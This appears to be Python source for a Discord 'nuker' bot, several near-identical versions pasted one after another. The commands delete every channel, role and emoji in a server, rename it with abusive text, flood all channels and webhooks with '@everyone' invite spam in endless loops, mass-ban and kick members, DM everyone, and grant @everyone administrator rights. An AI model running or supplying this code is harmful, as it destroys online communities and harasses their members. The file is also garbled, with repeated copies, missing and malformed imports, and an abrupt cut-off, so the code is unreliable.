import discord
import asyncio
import colorama
from colorama import Fore,Style,Back
import json
import random
import os

from discord.ext import commands
from discord import Permissions
from discord import Webhook
colorama.init()

os.system('cls')

try:
    with open("version.txt") as data:
        version = data.readline()
except FileNotFoundError:
    try:
        with open("../version.txt") as data:
            version = data.readline()
    except FileNotFoundError:
        version = ""

embedColor = 0x5c92ff
colors = {"main": Fore.CYAN,
          "white": Fore.WHITE,
          "red": Fore.RED}
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
        "input": f"{colors['white']}{colors['main']}>>{colors['white']}",
        "pressenter": f"{colors['white']}[{colors['main']}i{colors['white']}] Press ENTER to exit"}


async def msg_delete(ctx):
    """
    Trying to delete activation message
    """
    try:
        await ctx.message.delete()
    except:
        print(f"{msgs['error']} Can't delete your message")


def checkVersion():
    """
    Checking for new versions on GitHub
    """
    if version == "":
        return ""
    req = requests.get(
        "https://raw.githubusercontent.com/ICEGXG/UntitledNuker/master/version.txt")
    if req.status_code == requests.codes.ok:
        gitVersion = req.text.rstrip()
        if version == gitVersion:
            return "(Latest)"
        else:
            return "(Update available)"
    else:
        return "(Update check failed)"


def checkActivity(type, text):
    if type == "playing":
        return discord.Game(name=text)
    elif type == "listening":
        return discord.Activity(type=discord.ActivityType.listening, name=text)
    elif type == "watching":
        return discord.Activity(type=discord.ActivityType.watching, name=text)
    else:
        return None


"""
Fetching prefix, token and owner ID's from config
If there's no config, requests data from the user and creates it
"""
try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
    token = config["token"]
    prefix = config["prefix"]
    owners = config["owners"]
    whiteListBool = config["whitelistbool"]
    activity = config["activity"]
    enablelogging = config["discordlogging"]
    print(f"{msgs['info']} Loaded config.json")
except FileNotFoundError:
    token = input(f"Paste token {msgs['input']} ")
    prefix = input(f"Paste prefix {msgs['input']} ")
    owners = input(
        f"Paste bot's owner ID (If several use ',') {msgs['input']} ")
    whiteListYesOrNo = input(
        f"Enable whitelisting (y/n) {msgs['input']} ").lower()
    whiteListBool = True if whiteListYesOrNo == "y" else False
    owners = owners.replace(" ", "")
    if "," in owners:
        owners = owners.split(",")
        owners = list(map(int, owners))
    else:
        owners = [int(owners)]
    activity = {"type": "playing",
                "text": f"Untitled Nuker v{version}",
                "isenabled": True}
    enablelogging = False
    config = {
        "token": token,
        "prefix": prefix,
        "owners": owners,
        "whitelistbool": whiteListBool,
        "activity": activity,
        "discordlogging": enablelogging
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    print(f"{msgs['info']} Created config.json")


if activity["isenabled"]:
    activityToBot = checkActivity(activity["type"], activity["text"])
else:
    activityToBot = None


bot = commands.Bot(command_prefix=prefix,
                   activity=activityToBot, intents=discord.Intents.all())
bot.remove_command("help")


def isOwner(ctx):
    return ctx.author.id in owners


def isWhitelisted(ctx):
    if whiteListBool:
        return ctx.author.id in owners
    else:
        return True

client = commands.Bot(command_prefix="?", intents = discord.Intents.all())
######################################setup########################################
token = ''
channel_names = ['HACKER!!!']
message_spam = ['@everyone jija aagaya ! https://discord.gg/UkmV2HCq GET FUCKED UP']
webhook_names = ['.gg/X7rpYdxRsb RUNZ CORD', '.gg/X7rpYdxRsb RUNZ CORD','.gg/X7rpYdxRsb RUNZ CORD ', '.gg/X7rpYdxRsb RUNZ CORD']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "?help" ))#change this if you want
  print(f''' 

Nuke Made By HACKER
 looks like someones gonna fucked up so hard
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >hackerown To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def Nuke(ctx, amount=200):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By hacker jija")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully swizz!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To swizz Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made nuked Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create nuked Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Fucked")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def prune(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Hacker Fucks You")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"Hritik nuker is here")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")






client.run(token)
from keep_alive import keep_import 
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook

client = commands.Bot(command_prefix="?", intents = discord.Intents.all())

######################################setup########################################
token = '' 
channel_names = ['HACKER!!!']
message_spam = ['@everyone jija aagaya https://discord.gg/UkmV2HCq ! LOL ']
webhook_names = ['Fucked by Team HACKER', 'I got you bitch','RunZ You ', 'Tsugikuni Here']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "?help" ))#change this if you want
  print(f''' 

Nuke Made By HACKER
 looks like someones gonna fucked up so hard
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >hackerown To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def tsontop(ctx, amount=20):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By Hacker")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully swizz!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To swizz Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made nuked Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create nuked Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Tsugikuni RunZ Me")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def prune(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Ts Fucks You")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"Hacker nuker is here")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")






client.run(token)
from keep_alive import keepimport 
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook

client = commands.Bot(command_prefix="?", intents = discord.Intents.all())

######################################setup########################################
token = '' 
channel_names = ['HACKER jija aagaya']
message_spam = ['@everyone jija aagaya !  ']
webhook_names = ['Fucked by HACKER', 'I got you bitch','RunZ You ', 'Tsugikuni Here']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "?help" ))#change this if you want
  print(f''' 

Nuke Made By HACKER
 looks like someones gonna fucked up so hard
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >hackerown To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def tsontop(ctx, amount=20):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By HACKER")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully swizz!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To swizz Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made nuked Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create nuked Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Tsugikuni RunZ Me")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def prune(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Ts Fucks You")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"HACKER nuker is here")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")






client.run(token)
from keep_alive import keep_import 
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook

client = commands.Bot(command_prefix="?", intents = discord.Intents.all())

######################################setup########################################
token = '' 
channel_names = ['jija aagaya']
message_spam = ['@everyone jija aagaya ! LOL ']
webhook_names = ['Fucked by HACKER', 'I got you bitch','RunZ You ', 'Tsugikuni Here']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "?help" ))#change this if you want
  print(f''' 

Nuke Made By Hacker
 looks like someones gonna fucked up so hard
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >hackerown To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def tsontop(ctx, amount=20):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By HACKER")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully swizz!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To swizz Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made nuked Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create nuked Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Tsugikuni RunZ Me")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def prune(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="hacker Fucks You")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"Hacker nuker is here")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")


client.run(token)
from keep_alive import keep_alive
import discord
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook

client = commands.Bot(command_prefix="?", intents = discord.Intents.all())

######################################setup########################################
token = '' 
channel_names = ['hacker jija aagaya']
message_spam = ['@everyone jija aagaya ! LOL ']
webhook_names = ['Fucked by Team tiger', 'I got you bitch','RunZ You ', 'Tsugikuni Here']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "?help" ))#change this if you want
  print(f''' 

Nuke Made By Hacker
 looks like someones gonna fucked up so hard
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >hackerown To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def tsontop(ctx, amount=20):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By Hacker")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully swizz!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To swizz Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made nuked Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create nuked Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Tsugikuni RunZ Me")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def prune(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="hacker Fucks You")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"Hacker nuker is here")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")






client.run(token)
from keep_alive import keep_import 
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook

client = commands.Bot(command_prefix="?", intents = discord.Intents.all())

######################################setup########################################
token = '' 
channel_names = ['HACKER jija aagaya']
message_spam = ['@everyone jija aagaya ! https://discord.gg/F4FZXA6T ']
webhook_names = ['Fucked by hacker', 'I got you bitch','RunZ You ', 'Tsugikuni Here']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "?help" ))#change this if you want
  print(f''' 

Nuke Made By HACKER
 looks like someones gonna fucked up so hard
 ═══════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType >hackerown To Begin Nuking
\x1b[38;5;172mVersion: v1.8
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def tsontop(ctx, amount=20):
  await ctx.message.delete()
  await ctx.guild.edit(name="Fucked By HACKER")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully swizz!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To swizz Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made nuked Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create nuked Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "Hacker RunZ Me")
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def prune(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully pruned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To prune {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="hacker Fucks You")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"HACKER nuker is here")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")






client.run(token)
from keep_alive import keepimport 
import asyncio
import colorama
import json
import random
